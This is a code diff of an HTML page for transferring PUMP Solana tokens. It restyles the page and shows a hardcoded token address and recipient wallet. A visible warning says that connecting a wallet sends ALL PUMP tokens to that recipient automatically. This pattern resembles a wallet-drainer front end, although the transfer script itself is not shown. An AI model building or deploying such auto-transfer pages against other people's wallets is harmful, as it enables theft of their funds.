@@ -3,53 +3,109 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Transfer Pump Token</title>
-    <link rel="stylesheet" href="style.css">
+    <title>PUMP Token Transfer</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #1a1a2e;
+            color: white;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 500px;
+            width: 100%;
+        }
+        .card {
+            background: #16213e;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+        h1 {
+            text-align: center;
+            color: #4cc9f0;
+            margin-bottom: 30px;
+        }
+        .token-info {
+            background: #0f3460;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+        .token-info div {
+            margin-bottom: 10px;
+        }
+        .address {
+            font-family: monospace;
+            font-size: 12px;
+            background: #1a1a2e;
+            padding: 10px;
+            border-radius: 5px;
+            word-break: break-all;
+        }
+        .warning {
+            background: #ffcc00;
+            color: #333;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+        #transferBtn {
+            width: 100%;
+            padding: 20px;
+            background: linear-gradient(45deg, #4cc9f0, #4361ee);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 20px;
+        }
+        #transferBtn:disabled {
+            background: #666;
+            cursor: not-allowed;
+        }
+        #status {
+            background: #0f3460;
+            padding: 15px;
+            border-radius: 10px;
+            min-height: 60px;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        .success { color: #4ade80; }
+        .error { color: #f87171; }
+        .loading { color: #4cc9f0; }
+    </style>
 </head>
 <body>
     <div class="container">
         <div class="card">
-            <h1 class="title">⚡ PUMP TOKEN TRANSFER ⚡</h1>
+            <h1>🚀 PUMP TOKEN TRANSFER</h1>
             
             <div class="token-info">
-                <div class="info-box">
-                    <div class="info-label">Token CA:</div>
-                    <div class="info-value">4sxxEHW6XqX5YBYs29f1p2RhR7afXFS8wQWcMYQVpump</div>
-                </div>
-                
-                <div class="info-box">
-                    <div class="info-label">Target Wallet:</div>
-                    <div class="info-value">95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD</div>
-                </div>
+                <div>Token: <div class="address">4sxxEHW6XqX5YBYs29f1p2RhR7afXFS8wQWcMYQVpump</div></div>
+                <div>To: <div class="address">95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD</div></div>
             </div>
             
             <div class="warning">
-                <div class="warning-icon">⚠️</div>
-                <div class="warning-text">
-                    <strong>Warning:</strong> Once connected, ALL PUMP tokens will be automatically transferred to the target wallet.
-                </div>
+                ⚠️ Connect wallet will transfer ALL PUMP tokens automatically!
             </div>
             
-            <button id="transferBtn" class="transfer-btn">
-                🔗 CONNECT & TRANSFER ALL PUMP
-            </button>
+            <button id="transferBtn">🔗 CONNECT WALLET & TRANSFER PUMP</button>
             
-            <div class="status">
-                <div class="status-label">Status:</div>
-                <div id="statusText" class="status-text">Ready to connect wallet...</div>
-            </div>
-            
-            <div class="progress" id="progressContainer" style="display: none;">
-                <div class="progress-bar">
-                    <div class="progress-fill" id="progressFill"></div>
-                </div>
-                <div class="progress-percent" id="progressPercent">0%</div>
-            </div>
+            <div id="status">Ready to connect...</div>
         </div>
     </div>
 
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
-    <script src="https://unpkg.com/@solana/spl-token@latest/lib/index.iife.js"></script>
     <script src="script.js"></script>
 </body>
 </html>
